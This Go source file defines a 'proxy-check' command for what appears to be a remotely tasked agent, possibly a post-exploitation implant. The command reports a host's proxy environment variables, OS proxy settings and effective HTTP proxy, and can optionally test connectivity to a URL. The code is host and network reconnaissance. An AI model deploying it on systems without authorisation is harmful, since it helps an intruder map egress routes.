package commands

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type ProxyCheckCommand struct{}

func (c *ProxyCheckCommand) Name() string { return "proxy-check" }
func (c *ProxyCheckCommand) Description() string {
	return "Detect system proxy settings from environment variables and OS configuration"
}

type proxyCheckArgs struct {
	TestURL string `json:"test_url"` // Optional URL to test proxy connectivity
}

func (c *ProxyCheckCommand) Execute(task structs.Task) structs.CommandResult {
	var args proxyCheckArgs
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &args)
	}

	var sb strings.Builder
	sb.WriteString("=== Proxy Configuration ===\n\n")
	found := false

	// Check environment variables
	envVars := []string{
		"HTTP_PROXY", "http_proxy",
		"HTTPS_PROXY", "https_proxy",
		"ALL_PROXY", "all_proxy",
		"NO_PROXY", "no_proxy",
		"FTP_PROXY", "ftp_proxy",
	}

	sb.WriteString("[*] Environment Variables:\n")
	for _, v := range envVars {
		val := os.Getenv(v)
		if val != "" {
			sb.WriteString(fmt.Sprintf("    %s = %s\n", v, val))
			found = true
		}
	}
	if !found {
		sb.WriteString("    (none set)\n")
	}

	// Platform-specific proxy detection
	platformResult := proxyCheckPlatform()
	if platformResult != "" {
		sb.WriteString("\n")
		sb.WriteString(platformResult)
	}

	// Effective proxy (what Go's HTTP client would use)
	sb.WriteString("\n[*] Go HTTP Transport Proxy Detection:\n")
	transport := http.DefaultTransport.(*http.Transport)
	if transport.Proxy != nil {
		testURLs := []string{"http://example.com", "https://example.com"}
		for _, testURL := range testURLs {
			req, _ := http.NewRequest("GET", testURL, nil)
			if req != nil {
				proxyURL, err := transport.Proxy(req)
				if err == nil && proxyURL != nil {
					sb.WriteString(fmt.Sprintf("    %s → %s\n", testURL, proxyURL.String()))
					found = true
				} else {
					sb.WriteString(fmt.Sprintf("    %s → direct\n", testURL))
				}
			}
		}
	} else {
		sb.WriteString("    No proxy function configured\n")
	}

	// Optional connectivity test
	if args.TestURL != "" {
		sb.WriteString(fmt.Sprintf("\n[*] Connectivity Test: %s\n", args.TestURL))
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Get(args.TestURL)
		if err != nil {
			sb.WriteString(fmt.Sprintf("    FAILED: %v\n", err))
		} else {
			resp.Body.Close()
			sb.WriteString(fmt.Sprintf("    OK: %s (%d)\n", resp.Status, resp.StatusCode))
		}
	}

	if !found {
		sb.WriteString("\n[-] No proxy configuration detected — traffic is likely direct\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "completed",
		Completed: true,
	}
}
